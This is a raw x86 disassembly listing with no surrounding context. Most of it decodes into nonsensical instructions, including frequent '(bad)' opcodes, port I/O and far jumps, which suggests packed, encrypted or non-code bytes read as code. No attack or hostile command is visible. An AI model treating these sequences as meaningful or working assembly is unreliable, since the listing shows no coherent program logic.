  40eb2f:	(bad)  
  40eb30:	adc    DWORD PTR [esi+0x2bfe4227],ebx
  40eb36:	(bad)  
  40eb37:	fsubr  DWORD PTR [eax]
  40eb39:	aad    0x90
  40eb3b:	xchg   edi,eax
  40eb3c:	add    DWORD PTR [ebp-0x734c730a],ebx
  40eb42:	cld    
  40eb43:	jge    0x40eb58
  40eb45:	ins    DWORD PTR es:[edi],dx
  40eb46:	push   ebp
  40eb47:	fdiv   QWORD PTR [edi-0x20bfb22f]
  40eb4d:	lods   eax,DWORD PTR ds:[esi]
  40eb4e:	xor    ecx,ebx
  40eb50:	pop    ebp
  40eb51:	ror    DWORD PTR [eax-0x1ba01496],1
  40eb57:	adc    BYTE PTR [ebp+eax*2+0x30],ch
  40eb5b:	clc    
  40eb5c:	ins    DWORD PTR es:[edi],dx
  40eb5d:	test   BYTE PTR [edx+0x7f9a52e7],0x8d
  40eb64:	xchg   DWORD PTR gs:[edx],ebp
  40eb67:	scas   eax,DWORD PTR es:[edi]
  40eb68:	pop    esp
  40eb69:	push   0xffffffa3
  40eb6b:	rep outs dx,DWORD PTR ds:[esi]
  40eb6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb6e:	ret    
  40eb6f:	imul   ecx,DWORD PTR [ebx-0xb],0xffffffe6
  40eb73:	dec    esi
  40eb74:	xor    eax,0x5eb3dbac
  40eb79:	push   0x5a7fdad2
  40eb7e:	mov    edi,0x5b3c74cd
  40eb83:	jle    0x40ebf2
  40eb85:	(bad)  
  40eb86:	add    BYTE PTR [eax-0x5c4b6354],0x94
  40eb8d:	sbb    DWORD PTR ds:0x52453db2,edi
  40eb93:	adc    ecx,esi
  40eb95:	inc    edx
  40eb96:	std    
  40eb97:	cs mov dh,0x5
  40eb9a:	es sahf 
  40eb9c:	(bad)  
  40eb9e:	push   eax
  40eb9f:	push   cs
  40eba0:	mov    esp,0x78765b4d
  40eba5:	pop    ds
  40eba6:	(bad)  
  40eba7:	mov    al,ds:0x581976ac
  40ebac:	sub    al,0x3a
  40ebae:	and    BYTE PTR [eax-0x4b37a4ba],0xca
  40ebb5:	mov    edx,eax
  40ebb7:	out    0x7d,al
  40ebb9:	push   ss
  40ebba:	or     eax,0x54dbd5c4
  40ebbf:	dec    esi
  40ebc0:	test   dh,al
  40ebc2:	mul    ebp
  40ebc4:	iret   
  40ebc5:	fimul  WORD PTR [ebp+0x7d357fa0]
  40ebcb:	pop    es
  40ebcc:	xchg   edi,edi
  40ebce:	repnz call 0x1695:0xf37404db
  40ebd6:	lock xlat BYTE PTR ds:[ebx]
  40ebd8:	stos   BYTE PTR es:[edi],al
  40ebd9:	mov    BYTE PTR [ecx],ah
  40ebdb:	xchg   esp,eax
  40ebdc:	add    eax,0xda56ab42
  40ebe1:	popa   
  40ebe2:	in     al,0x93
  40ebe4:	int3   
  40ebe5:	jge    0x40ec4a
  40ebe7:	sbb    al,0x36
  40ebe9:	jecxz  0x40ec37
  40ebeb:	jne    0x40eb89
  40ebed:	pop    bx
  40ebef:	inc    edx
  40ebf0:	mov    ds:0xd331781e,eax
  40ebf5:	fdiv   st,st(0)
  40ebf7:	repz arpl WORD PTR [edi-0x5d],cx
  40ebfb:	lahf   
  40ebfc:	inc    ebp
  40ebfd:	lods   al,BYTE PTR ds:[esi]
  40ebfe:	mov    bl,0x8e
  40ec00:	sub    dl,BYTE PTR [eax-0x2dd2347d]
  40ec06:	adc    al,0xc6
  40ec08:	add    ecx,DWORD PTR [ebx+0x11]
  40ec0b:	rcr    DWORD PTR [eax+eiz*2],cl
  40ec0e:	pop    es
  40ec0f:	jp     0x40ec2d
  40ec11:	push   ebx
  40ec12:	mov    cl,0xba
  40ec14:	js     0x40ec1a
  40ec16:	fsubrp st(2),st
  40ec18:	fisub  WORD PTR [edi+ecx*8+0x579a198c]
  40ec1f:	aas    
  40ec20:	div    DWORD PTR [ebp+0x35]
  40ec23:	push   0x9483ee54
  40ec28:	ficom  WORD PTR [edi-0x68977b6f]
  40ec2e:	out    0xae,al
  40ec30:	imul   ebx
  40ec32:	cmp    ch,0xaa
  40ec35:	mov    dl,ch
  40ec37:	imul   esi,DWORD PTR [ecx],0x49
  40ec3a:	inc    ebp
  40ec3b:	or     eax,0x6553ac2d
  40ec40:	or     BYTE PTR [edi],0xd
  40ec43:	push   esi
  40ec44:	pop    ebp
  40ec45:	jnp    0x40ec0c
  40ec47:	aaa    
  40ec48:	jl     0x40ec1a
  40ec4a:	cmc    
  40ec4b:	and    edx,DWORD PTR [esi+ebx*2+0x6b]
  40ec4f:	xlat   BYTE PTR ds:[ebx]
  40ec50:	push   0x5c
  40ec52:	and    ah,BYTE PTR [edi]
  40ec54:	ss push edx
  40ec56:	and    eax,0x72368d84
  40ec5b:	pop    es
  40ec5c:	in     eax,dx
  40ec5d:	and    DWORD PTR fs:[ecx-0x69],esp
  40ec61:	sub    bh,BYTE PTR [edx+0x409e4ce0]
  40ec67:	jp     0x40ec8e
  40ec69:	mov    esp,0xa43352f9
  40ec6e:	clc    
  40ec6f:	mov    ah,0xdb
  40ec71:	or     BYTE PTR ss:[eax],bl
  40ec74:	int    0xbf
  40ec76:	fld    DWORD PTR [esi-0xa]
  40ec79:	pop    edi
  40ec7a:	or     al,0xcc
  40ec7c:	lea    esi,[ecx+0x6b]
  40ec7f:	pop    ds
  40ec80:	adc    DWORD PTR [edi],0xb0e071bf
  40ec86:	adc    DWORD PTR [ebx-0x6f],ebp
  40ec89:	pop    es
  40ec8a:	and    ebp,DWORD PTR [esi-0x78]
  40ec8d:	cmc    
  40ec8e:	jnp    0x40ec17
  40ec90:	and    al,0xa
  40ec92:	inc    edi
  40ec93:	jmp    0x40eca4
  40ec95:	mov    ecx,0x6cb17b0a
  40ec9a:	mov    eax,0xbd093234
  40ec9f:	fdivr  QWORD PTR [edi-0x4dcc827a]
  40eca5:	jmp    0x40ec9d
  40eca7:	pop    ecx
  40eca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca9:	push   es
  40ecaa:	data16 or bh,BYTE PTR [ebp+eax*8+0x6c2aa1f5]
  40ecb2:	fs mov bh,0xeb
  40ecb5:	push   esp
  40ecb6:	add    eax,0xb5e0a287
  40ecbb:	ror    BYTE PTR [esi-0x3e],1
  40ecbe:	add    esi,DWORD PTR [edx-0x2c]
  40ecc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecc2:	repz jge 0x40ecf9
  40ecc5:	xchg   edi,eax
  40ecc6:	xchg   edi,eax
  40ecc7:	pop    edx
  40ecc8:	ins    DWORD PTR es:[edi],dx
  40ecc9:	jge    0x40ed00
  40eccb:	lods   al,BYTE PTR ds:[esi]
  40eccc:	push   cs
  40eccd:	test   al,0xe0
  40eccf:	sub    ah,BYTE PTR [edx]
  40ecd1:	xor    dl,dh
  40ecd3:	out    dx,eax
  40ecd4:	js     0x40ec7d
  40ecd6:	mov    esi,0x6cc9806a
  40ecdb:	in     eax,0x31
  40ecdd:	add    BYTE PTR fs:[eax+0x42c8f89e],0xc6
  40ece5:	xlat   BYTE PTR ds:[ebx]
  40ece6:	std    
  40ece7:	loope  0x40ed51
  40ece9:	pop    ebp
  40ecea:	enter  0x5305,0x4b
  40ecee:	jmp    0x6ba8d5ce
  40ecf3:	iret   
  40ecf4:	xchg   edx,eax
  40ecf5:	mov    dh,BYTE PTR [ebx-0x35875286]
  40ecfb:	fnstsw WORD PTR [eax-0xdf6f1c6]
  40ed01:	imul   esp,DWORD PTR [eax],0x8489dbc7
  40ed07:	test   eax,0xf09b262c
  40ed0c:	ins    DWORD PTR es:[edi],dx
  40ed0d:	push   0x15c22145
  40ed12:	jo     0x40ed4b
  40ed14:	mov    eax,ds:0xc295d001
  40ed19:	ins    BYTE PTR es:[edi],dx
  40ed1a:	rcl    DWORD PTR [edx+ebx*8],0xb1
  40ed1e:	jae    0x40ecde
  40ed20:	mov    eax,ds:0x536ae7ac
  40ed25:	(bad)  
  40ed26:	test   eax,0x1ac6e3c0
  40ed2b:	pop    edi
  40ed2c:	adc    eax,0x7bbbdfc5
  40ed31:	in     eax,dx
  40ed32:	ret    0x47fc
  40ed35:	ja     0x40ed89
  40ed37:	fnstcw WORD PTR [esi+esi*1-0x71]
  40ed3b:	(bad)  
  40ed3d:	sub    al,0x72
  40ed3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed40:	mov    ebx,0xe3388104
  40ed45:	test   al,0x81
  40ed47:	mov    dl,0x24
  40ed49:	mov    esp,0x70eb3b9c
  40ed4e:	mov    eax,0xcea72bdf
  40ed53:	popf   
  40ed54:	(bad)  
  40ed55:	rcr    DWORD PTR [ebp+0x5f],cl
  40ed58:	les    ebx,FWORD PTR [esi]
  40ed5a:	inc    ebp
  40ed5b:	push   edx
  40ed5c:	fcomp  QWORD PTR [ebx]
  40ed5e:	je     0x40edb8
  40ed60:	inc    edi
  40ed61:	and    BYTE PTR [edx],0xd2
  40ed64:	push   ds
  40ed65:	xchg   ebp,eax
  40ed66:	add    DWORD PTR [ebx-0x59],ecx
  40ed69:	cmc    
  40ed6a:	not    DWORD PTR [eax]
  40ed6c:	add    ch,al
  40ed6e:	add    ebx,DWORD PTR fs:[ebx+eiz*4+0x78708645]
  40ed76:	xchg   ebp,eax
  40ed77:	add    esp,eax
  40ed79:	xchg   esi,eax
  40ed7a:	aas    
  40ed7b:	out    dx,al
  40ed7c:	rcl    BYTE PTR [ebp+0xcb0378],cl
  40ed82:	mov    ah,0x5c
  40ed84:	jae    0x40ed4e
  40ed86:	popf   
  40ed87:	xchg   esi,eax
  40ed88:	test   DWORD PTR [edi-0x2c38c8e4],0x72c5ae7d
  40ed92:	xchg   DWORD PTR [esp+edx*4],esp
  40ed95:	and    esi,esp
  40ed97:	popa   
  40ed98:	shr    BYTE PTR [ebx+0x1d],cl
  40ed9b:	sub    edi,ecx
  40ed9d:	and    DWORD PTR ds:0x8f238604,edi
  40eda3:	jle    0x40ed28
  40eda5:	sbb    al,0x32
  40eda7:	dec    esi
  40eda8:	xor    DWORD PTR [eax+0x5943cb98],0xe9ee5898
  40edb2:	repz ss xor ah,ch
  40edb6:	jg     0x40ee0a
  40edb8:	inc    eax
  40edb9:	pop    esp
  40edba:	in     eax,dx
  40edbb:	add    bl,BYTE PTR [ebp+0x54]
  40edbe:	iret   
  40edbf:	mov    cl,0xa2
  40edc1:	mov    ds:0x967ab6bb,al
  40edc6:	mov    bl,0x36
  40edc8:	mov    ebx,0x9c536e30
  40edcd:	icebp  
  40edce:	or     eax,DWORD PTR [esi]
  40edd0:	inc    BYTE PTR [esi+0x5]
  40edd3:	mov    ah,0xf5
  40edd5:	ficomp WORD PTR [ebx]
  40edd7:	clc    
  40edd8:	fwait
  40edd9:	push   esp
  40edda:	jp     0x40ed64
  40eddc:	sbb    ebp,DWORD PTR [esi+0x49207cfb]
  40ede2:	cmp    al,BYTE PTR ds:0x1ab032
  40ede8:	sbb    al,0xfb
  40edea:	aad    0x59
  40edec:	and    DWORD PTR [ebp+0x23],esi
  40edef:	or     dh,BYTE PTR [esp+eiz*8+0x57759730]
  40edf6:	push   eax
  40edf7:	ins    BYTE PTR es:[edi],dx
  40edf8:	push   esp
  40edf9:	dec    ebx
  40edfa:	call   0x3fe2:0xb100121b
  40ee01:	inc    ebx
  40ee02:	out    dx,al
  40ee03:	mov    ebx,0x9f919c37
  40ee08:	cdq    
  40ee09:	sub    edi,ebx
  40ee0b:	shr    BYTE PTR [ebp-0x26],cl
  40ee0e:	jmp    0x40ee75
  40ee10:	dec    esi
  40ee11:	(bad)  
  40ee12:	aad    0x24
  40ee14:	das    
  40ee15:	mov    ebp,0x58f1cab
  40ee1a:	stos   BYTE PTR es:[edi],al
  40ee1b:	push   ebp
  40ee1c:	idiv   BYTE PTR [edi+0x4dd776fd]
  40ee22:	xchg   DWORD PTR [ebx],ebp
  40ee24:	inc    eax
  40ee25:	stc    
  40ee26:	sbb    ch,dl
  40ee28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee29:	inc    esp
  40ee2a:	lods   eax,DWORD PTR ds:[esi]
  40ee2b:	je     0x40edbc
  40ee2d:	mov    ebx,DWORD PTR [esi+0x4e]
  40ee30:	cmp    al,0x85
  40ee33:	ret    0x938a
  40ee36:	and    al,0x66
  40ee38:	mov    ch,0xa6
  40ee3a:	sub    eax,0x405c0d87
  40ee3f:	push   0xc7936db8
  40ee44:	imul   eax,DWORD PTR [edx],0xffffffa8
  40ee47:	stos   DWORD PTR es:[edi],eax
  40ee48:	out    0x45,al
  40ee4a:	lea    ecx,[ecx+0x11d9179f]
  40ee50:	mov    ch,0xba
  40ee52:	ins    BYTE PTR es:[edi],dx
  40ee53:	xor    eax,0x7bf0655b
  40ee58:	aad    0x91
  40ee5a:	ret    0x8e07
  40ee5d:	ds xchg esp,eax
  40ee5f:	mov    edi,0xb9a4c42e
  40ee64:	pop    ebp
  40ee65:	mov    dl,0xb9
  40ee67:	dec    edx
  40ee68:	mov    dh,0x24
  40ee6a:	mov    WORD PTR [ecx+0x0],cs
  40ee6d:	hlt    
  40ee6e:	push   cs
  40ee6f:	scas   al,BYTE PTR es:[edi]
  40ee70:	retf   0x41c0
  40ee73:	ds jb  0x40eecc
  40ee76:	cwde   
  40ee77:	push   ebp
  40ee78:	sbb    eax,0x76c3056f
  40ee7d:	xchg   esi,eax
  40ee7e:	add    edi,DWORD PTR [eax+ebx*1]
  40ee81:	and    edi,ebx
  40ee83:	test   DWORD PTR [ecx+0x79948fab],esp
  40ee89:	daa    
  40ee8a:	fdivrp st(1),st
  40ee8c:	(bad)  
  40ee8d:	xor    BYTE PTR [ebx+esi*2+0x850f810],al
  40ee94:	sbb    DWORD PTR ds:0x8ea005ec,0x28ab1e07
  40ee9e:	xchg   edx,eax
  40ee9f:	jbe    0x40eea5
  40eea1:	dec    edx
  40eea2:	jmp    0xa4d5:0xb56f0634
  40eea9:	or     DWORD PTR [edi+0x27ee478d],ebp
  40eeaf:	fistp  DWORD PTR [ebp-0x3c]
  40eeb2:	stos   BYTE PTR es:[edi],al
  40eeb3:	mov    esp,0x49a420f3
  40eeb8:	scas   eax,DWORD PTR es:[edi]
  40eeb9:	sar    BYTE PTR [edi+0x42d27579],cl
  40eebf:	bound  edi,QWORD PTR [eax-0x38]
  40eec2:	retf   0xf86b
  40eec5:	fidiv  DWORD PTR [eax]
  40eec7:	(bad)  
  40eec8:	arpl   sp,dx
  40eeca:	push   ecx
  40eecb:	xlat   BYTE PTR ds:[ebx]
  40eecc:	and    bh,ch
  40eece:	sub    eax,0x33d6c94
  40eed3:	and    edx,DWORD PTR [esi]
  40eed5:	xor    al,0xbb
  40eed7:	jbe    0x40eee7
  40eed9:	(bad)  
  40eeda:	sbb    BYTE PTR [eax+eiz*4+0x34],dl
  40eede:	inc    ecx
  40eee0:	dec    esp
  40eee1:	lock mov ecx,DWORD PTR [eax]
  40eee4:	xor    al,0xe2
  40eee6:	ror    ebp,1
  40eee8:	sar    BYTE PTR [eax-0x5ced4ab1],1
  40eeee:	dec    esi
  40eeef:	xor    bh,ah
  40eef1:	test   BYTE PTR [edi],bl
  40eef3:	imul   edi,ebp,0x5bafc4b4
  40eef9:	add    BYTE PTR [ebx-0x4f],dh
  40eefc:	std    
  40eefd:	gs ins DWORD PTR es:[edi],dx
  40eeff:	mov    eax,ds:0x97b7dde5
  40ef04:	popf   
  40ef05:	popa   
  40ef06:	add    BYTE PTR [edx],al
  40ef08:	pusha  
  40ef09:	loopne 0x40ef5e
  40ef0b:	cwde   
  40ef0c:	dec    edx
  40ef0d:	xchg   ecx,eax
  40ef0e:	jle    0x40ef8f
  40ef10:	and    DWORD PTR [ebp-0x51],esi
  40ef13:	pusha  
  40ef14:	(bad)  [ebx+0x7651532e]
  40ef1a:	fcomp  st(6)
  40ef1c:	push   ss
  40ef1d:	xchg   esi,eax
  40ef1e:	cmp    eax,0x17d2277e
  40ef23:	inc    esi
  40ef24:	imul   BYTE PTR [ebx-0x38]
  40ef27:	adc    DWORD PTR [ecx],0xd8c6f04f
  40ef2d:	add    BYTE PTR [ecx-0x4d8cf1eb],dh
  40ef33:	jne    0x40eebd
  40ef35:	xchg   ebx,eax
  40ef36:	retf   0xd914
  40ef39:	imul   ebp,ecx,0x48f17d8b
  40ef3f:	jecxz  0x40efac
  40ef41:	jecxz  0x40ef96
  40ef43:	ins    BYTE PTR es:[edi],dx
  40ef44:	push   es
  40ef45:	xchg   esi,eax
  40ef46:	imul   DWORD PTR [edx]
  40ef48:	imul   edx,DWORD PTR ds:0xb89790b9,0x1c
  40ef4f:	jecxz  0x40ef37
  40ef51:	inc    ecx
  40ef52:	in     eax,0x2a
  40ef54:	mov    bh,0x87
  40ef56:	cmc    
  40ef57:	loop   0x40efa6
  40ef59:	fbld   TBYTE PTR [ecx-0x1a167e21]
  40ef5f:	clc    
  40ef60:	inc    eax
  40ef61:	in     al,0xc5
  40ef63:	clc    
  40ef64:	fld    QWORD PTR [ebx+0x29ec369e]
  40ef6a:	cld    
  40ef6b:	cmp    DWORD PTR [edx],edx
  40ef6d:	lea    edx,[ebp+ecx*1-0x3e]
  40ef71:	aaa    
  40ef72:	xor    al,0x23
  40ef74:	in     al,0x45
  40ef76:	and    eax,0x723199c0
  40ef7b:	jp     0x40efe2
  40ef7d:	sbb    bh,BYTE PTR [edi-0x7d8bb35b]
  40ef83:	pusha  
  40ef84:	cmp    eax,0x2497c2ef
  40ef89:	js     0x40efac
  40ef8b:	inc    ebx
  40ef8c:	jecxz  0x40ef52
  40ef8e:	mov    al,ds:0xbcca1efb
  40ef93:	xor    al,0xe6
  40ef95:	test   BYTE PTR [edi],bl
  40ef97:	jge    0x40ef1e
  40ef99:	fxch   st(3)
  40ef9b:	ret    
  40ef9c:	or     eax,0x738afab8
  40efa1:	jnp    0x40eff1
  40efa3:	jae    0x40ef28
  40efa5:	out    0x63,eax
  40efa7:	pop    bx
  40efa9:	and    eax,0x9417a721
  40efae:	in     al,dx
  40efaf:	cmc    
  40efb0:	cmp    ebp,0xffffffc3
  40efb3:	fimul  DWORD PTR [edx+ebp*4+0x33]
  40efb7:	inc    edi
  40efb8:	sbb    al,BYTE PTR [edi-0x14]
  40efbb:	icebp  
  40efbc:	pop    edx
  40efbd:	jae    0x40efbc
  40efbf:	loope  0x40f03d
  40efc1:	mov    bh,0xe5
  40efc3:	push   ecx
  40efc4:	js     0x40f018
  40efc6:	shr    cl,0x4a
  40efc9:	(bad)  
  40efca:	push   ebp
  40efcb:	(bad)  
  40efcc:	cdq    
  40efcd:	inc    ecx
  40efce:	fcomp  st(2)
  40efd0:	push   ds
  40efd1:	or     eax,0xe749cc0a
  40efd6:	je     0x40ef83
  40efd8:	push   edx
  40efd9:	pop    edi
  40efda:	in     eax,dx
  40efdb:	xchg   esp,eax
  40efdc:	rol    DWORD PTR [ebp-0x4],0xc2
  40efe0:	cld    
  40efe1:	or     al,0x1e
  40efe3:	daa    
  40efe4:	fadd   st,st(4)
  40efe6:	mov    ds:0x341d518b,al
  40efeb:	jmp    0xbaaa652c
  40eff0:	xchg   ebp,eax
  40eff1:	in     eax,0xa5
  40eff3:	pop    ecx
  40eff4:	and    al,0x2d
  40eff6:	push   esp
  40eff7:	push   edx
  40eff8:	js     0x40f01e
  40effa:	into   
  40effb:	out    dx,al
  40effc:	nop
  40effd:	neg    dl
  40efff:	stc    
  40f000:	sub    DWORD PTR [eax-0x5e],esp
  40f003:	pop    ebx
  40f004:	add    eax,0xce4eec37
  40f009:	ins    DWORD PTR es:[edi],dx
  40f00a:	sbb    ch,al
  40f00c:	mov    ?,WORD PTR [edx+0xfcb2781]
  40f012:	mov    esp,edi
  40f014:	adc    al,0x43
  40f016:	xor    ch,BYTE PTR [edi+0x14]
  40f019:	aaa    
  40f01a:	adc    al,0x56
  40f01c:	sbb    ah,BYTE PTR [eax+eiz*8+0x74]
  40f020:	sub    al,0xdd
  40f022:	(bad)  
  40f023:	in     al,dx
  40f024:	inc    ebx
  40f025:	in     eax,dx
  40f026:	ins    BYTE PTR es:[edi],dx
  40f027:	push   ss
  40f028:	nop
  40f029:	sub    cl,BYTE PTR ds:0xa85a9a43
  40f02f:	inc    ecx
  40f030:	cmp    bl,BYTE PTR [eax+0x4a9f193e]
  40f036:	fistp  DWORD PTR [ecx]
  40f038:	add    BYTE PTR ds:[eax+0x45c1ae6e],bh
  40f03f:	icebp  
  40f040:	adc    BYTE PTR [ebx],0x41
  40f043:	mov    WORD PTR [esp+ebp*8],cs
  40f046:	xchg   ecx,eax
  40f047:	es mov edx,0xd14ca690
  40f04d:	sti    
  40f04e:	cld    
  40f04f:	mov    eax,0xb8b0087b
  40f054:	mov    esp,eax
  40f056:	mov    cl,0x5e
  40f058:	push   edx
  40f059:	cmc    
  40f05a:	adc    DWORD PTR [ebx+0x7e],esp
  40f05d:	nop
  40f05e:	xchg   esp,eax
  40f05f:	sbb    esi,ecx
  40f061:	sub    eax,0xbbff174c
  40f066:	xlat   BYTE PTR ds:[ebx]
  40f067:	or     al,0x8
  40f069:	inc    ecx
  40f06a:	gs mov edi,0x3b798a5d
  40f070:	push   0x18941019
  40f075:	fisubr WORD PTR [edx-0x1ac8a317]
  40f07b:	inc    eax
  40f07c:	scas   eax,DWORD PTR es:[edi]
  40f07d:	mov    ah,BYTE PTR [ebx-0x40]
  40f080:	xchg   edi,eax
  40f081:	xor    esp,DWORD PTR [esi]
  40f083:	sbb    eax,0x352fb8c9
  40f088:	adc    DWORD PTR [esi+0x73],esi
  40f08b:	mov    ecx,0xb23aeec0
  40f090:	and    eax,0x6e99df7f
  40f095:	adc    al,0x7c
  40f097:	sub    BYTE PTR [edi-0x50],cl
  40f09a:	ins    DWORD PTR es:[edi],dx
  40f09b:	mov    bh,0x23
  40f09d:	inc    ebp
  40f09e:	push   0x581e5994
  40f0a3:	ret    
  40f0a4:	sub    al,0x83
  40f0a6:	scas   al,BYTE PTR es:[edi]
  40f0a7:	push   edx
  40f0a8:	enter  0x3e87,0x80
  40f0ac:	lahf   
  40f0ad:	adc    al,0x96
  40f0af:	pop    edi
  40f0b0:	and    edx,DWORD PTR ds:0x7bdb1741
  40f0b6:	push   esi
  40f0b7:	push   esp
  40f0b8:	pop    esi
  40f0b9:	fimul  WORD PTR [ebx]
  40f0bb:	(bad)  
  40f0bc:	xchg   cl,al
  40f0be:	stc    
  40f0bf:	dec    ecx
  40f0c0:	sbb    al,0xcf
  40f0c2:	mov    dh,BYTE PTR [ebp+ebp*2+0x73]
  40f0c6:	popf   
  40f0c7:	pop    eax
  40f0c8:	call   0xf545:0xa6b82b1a
  40f0cf:	aad    0xce
  40f0d1:	cmp    ah,BYTE PTR [ecx]
  40f0d3:	out    dx,eax
  40f0d4:	ror    DWORD PTR [esi+0x1004736c],1
  40f0da:	mov    ds:0x6c3acd7d,eax
  40f0df:	jge    0x40f117
  40f0e1:	popa   
  40f0e2:	pop    esi
  40f0e3:	and    dl,BYTE PTR [edi*1+0x165a03b3]
  40f0ea:	sar    DWORD PTR [ebp+ebx*2+0x9],1
  40f0ee:	cmp    esi,eax
  40f0f0:	pop    edi
  40f0f1:	adc    ecx,esp
  40f0f3:	and    eax,0xd598f96b
  40f0f8:	xchg   esi,eax
  40f0f9:	repnz xchg ebp,eax
  40f0fb:	mov    bl,BYTE PTR [esi-0x59b25fec]
  40f101:	xor    al,0xf6
  40f103:	push   edi
  40f104:	outs   dx,DWORD PTR ds:[esi]
  40f105:	lea    edx,[edi+0x1ad8accf]
  40f10b:	cmp    ebp,DWORD PTR [ebx]
  40f10d:	or     eax,0x9af56a52
  40f112:	in     eax,0x5a
  40f114:	cld    
  40f115:	test   eax,0xd2019e65
  40f11a:	iret   
  40f11b:	fs loopne 0x40f0ff
  40f11e:	jae    0x40f13f
  40f120:	into   
  40f121:	ret    
  40f122:	and    edi,eax
  40f124:	mov    eax,0x4bd8f7a5
  40f129:	dec    ebx
  40f12a:	push   ebx
  40f12b:	pop    ebx
  40f12c:	xor    eax,DWORD PTR [edx]
  40f12e:	test   eax,0xf65220b1
  40f133:	je     0x40f0e6
  40f135:	call   0x26dcd031
  40f13a:	xchg   edi,eax
  40f13b:	xchg   si,ax
  40f13d:	xor    edi,DWORD PTR [edx+0x40]
  40f140:	cli    
  40f141:	jmp    0x2086:0x45da7ad4
  40f148:	sbb    bl,BYTE PTR [ebp+0x7a25b17f]
  40f14e:	pop    ss
  40f14f:	inc    eax
  40f150:	jne    0x40f194
  40f152:	and    BYTE PTR [edi-0x5d0eeb83],bh
  40f158:	cmp    eax,0x844a5fd2
  40f15d:	and    eax,0x4e307e55
  40f162:	fwait
  40f163:	inc    esi
  40f164:	in     al,0x53
  40f166:	je     0x40f1b4
  40f168:	fdivr  DWORD PTR [ecx+0x4bed7134]
  40f16e:	and    eax,0x350d59d0
  40f173:	ins    DWORD PTR es:[edi],dx
  40f174:	xor    ch,bl
  40f176:	mov    ebx,0xecc77957
  40f17b:	mov    dl,0x3
  40f17d:	(bad)  
  40f17e:	and    eax,0x2af9c21b
  40f183:	xlat   BYTE PTR ds:[ebx]
  40f184:	push   cs
  40f185:	lods   eax,DWORD PTR ds:[esi]
  40f186:	add    al,0x53
  40f188:	cmp    bh,cl
  40f18a:	mov    esp,0xb120134b
  40f18f:	inc    edi
  40f190:	pcmpeqd mm2,QWORD PTR [ebx]
  40f193:	mov    ebp,0xc25b0a6a
  40f198:	shl    WORD PTR [ebx+0x7b59d517],0xdb
  40f1a0:	mov    cl,0xf3
  40f1a2:	ret    0x96ee
  40f1a5:	fs int3 
  40f1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a8:	scas   al,BYTE PTR es:[edi]
  40f1a9:	pop    esi
  40f1aa:	leave  
  40f1ab:	add    BYTE PTR [ebp+0x73c78533],dh
  40f1b1:	pop    esi
  40f1b2:	(bad)  
  40f1b3:	call   0x47401eb6
  40f1b8:	mov    ebp,0xd41952ae
  40f1bd:	add    esi,DWORD PTR [esi-0x1f22b2a8]
  40f1c3:	mov    ch,0xdd
  40f1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c6:	js     0x40f1be
  40f1c8:	jge    0x40f1ae
  40f1ca:	and    ebp,esi
  40f1cc:	cli    
  40f1cd:	sar    ch,1
  40f1cf:	mov    bh,0xcb
  40f1d1:	retf   0x7bd6
  40f1d4:	mov    ?,WORD PTR [ecx]
  40f1d6:	or     DWORD PTR [ecx-0x61],ebx
  40f1d9:	pop    ebp
  40f1da:	stos   BYTE PTR es:[edi],al
  40f1db:	inc    ebp
  40f1dc:	pop    bx
  40f1de:	mov    esi,0xa054976d
  40f1e3:	test   DWORD PTR [esi],edi
  40f1e5:	mov    ds:0xf70dfc3,eax
  40f1ea:	nop
  40f1eb:	mov    edi,0x7a7b8c86
  40f1f0:	outs   dx,BYTE PTR ds:[esi]
  40f1f1:	addps  xmm4,XMMWORD PTR [ecx+0x73]
  40f1f5:	ret    
  40f1f6:	js     0x40f230
  40f1f8:	jo     0x40f1f4
  40f1fa:	arpl   WORD PTR [esi+0x79],bx
  40f1fd:	aad    0x55
  40f1ff:	adc    edx,DWORD PTR [edi-0x14]
  40f202:	xchg   ebp,eax
  40f203:	icebp  
  40f204:	sbb    al,0xb6
  40f206:	xor    ebx,DWORD PTR [ebp+edi*4-0x6a]
  40f20a:	in     eax,0x9c
  40f20c:	in     al,0xa8
  40f20e:	psraw  mm2,QWORD PTR [ecx-0x25]
  40f212:	ins    DWORD PTR es:[edi],dx
  40f213:	xchg   ebp,eax
  40f214:	(bad)  
  40f215:	out    dx,al
  40f216:	inc    ebx
  40f217:	xlat   BYTE PTR ds:[ebx]
  40f218:	xor    ch,dh
  40f21a:	jbe    0x40f1b8
  40f21c:	pop    edi
  40f21d:	clc    
  40f21e:	push   0x5cc4fd3
  40f223:	xchg   ebp,eax
  40f224:	adc    ch,BYTE PTR [eax]
  40f226:	dec    edi
  40f227:	stos   BYTE PTR es:[edi],al
  40f228:	int3   
  40f229:	retf   0xf6f5
  40f22c:	dec    eax
  40f22d:	dec    edx
  40f22e:	xchg   edi,eax
  40f22f:	mul    BYTE PTR [ebp+0x34ccebc9]
  40f235:	adc    BYTE PTR [ebx],bh
  40f237:	pushf  
  40f238:	cli    
  40f239:	push   es
  40f23a:	clc    
  40f23b:	or     al,0xa6
  40f23d:	push   0xc77e82b0
  40f242:	mov    eax,0x99f470d0
  40f247:	cdq    
  40f248:	sbb    eax,0x3cf58c92
  40f24d:	or     DWORD PTR [edi],0xffffffd4
  40f250:	push   edx
  40f251:	mov    DWORD PTR [esi-0x6bb79eb2],ecx
  40f257:	jge    0x40f211
  40f259:	mov    ch,0x6d
  40f25b:	jecxz  0x40f29f
  40f25d:	arpl   WORD PTR [edx+ebx*1],di
  40f260:	dec    edi
  40f261:	sahf   
  40f262:	mov    cl,0x87
  40f264:	dec    ebx
  40f265:	adc    DWORD PTR [esi-0x65e9f672],ebx
  40f26b:	iret   
  40f26c:	lock and esp,DWORD PTR [ecx]
  40f26f:	push   es
  40f270:	pop    es
  40f271:	or     BYTE PTR [ecx+0x19],0x6b
  40f275:	pop    eax
  40f276:	add    eax,eax
  40f278:	xchg   DWORD PTR [edx+0x9],edi
  40f27b:	or     eax,0x65db1b7c
  40f280:	neg    BYTE PTR [ecx-0x11ec467e]
  40f286:	std    
  40f287:	int    0x4
  40f289:	ret    
  40f28a:	test   ebx,esp
  40f28c:	(bad)  
  40f28d:	xchg   esi,eax
  40f28e:	dec    edi
  40f28f:	mov    ch,0xda
  40f291:	jnp    0x40f300
  40f293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
